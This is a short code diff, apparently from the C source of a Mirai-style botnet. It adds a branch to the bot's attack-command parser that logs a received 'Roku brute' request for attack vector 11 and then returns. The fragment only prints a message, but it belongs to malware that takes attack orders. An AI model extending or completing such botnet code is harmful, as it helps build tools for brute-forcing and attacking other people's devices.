@@ -143,6 +143,11 @@ void attack_parse(char *buf, int len)
         }
     }
 
+	if (vector == 11) {
+        printf("[Brute] Recvd Roku brute req for %x:%s\n", ntohl(targs[0].addr), opts[0].val);
+        return;
+    }    
+
     errno = 0;
     attack_start(duration, vector, targs_len, targs, opts_len, opts);
 
